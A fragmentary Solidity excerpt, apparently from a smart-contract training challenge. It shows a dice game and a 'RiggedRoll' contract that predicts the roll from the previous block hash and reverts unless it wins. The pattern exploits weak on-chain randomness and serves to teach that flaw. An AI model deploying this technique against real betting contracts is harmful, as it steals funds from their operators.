...
contract DiceGame {
  ...
  function rollTheDice() public payable {
    ...
    console.log('THE TRUE ROLL IS ', roll);
...
contract RiggedRoll is Ownable {
  ...
  function riggedRoll() public payable {
    require(address(this).balance >= .002 ether, 'Not enough in contract to roll');
    bytes32 prevHash = blockhash(block.number - 1);
    ...
    if (roll > 2) {
      console.log('Rigged Roll is a loser');
      revert();
    } else {
      console.log('Rigged Roll is a winner');
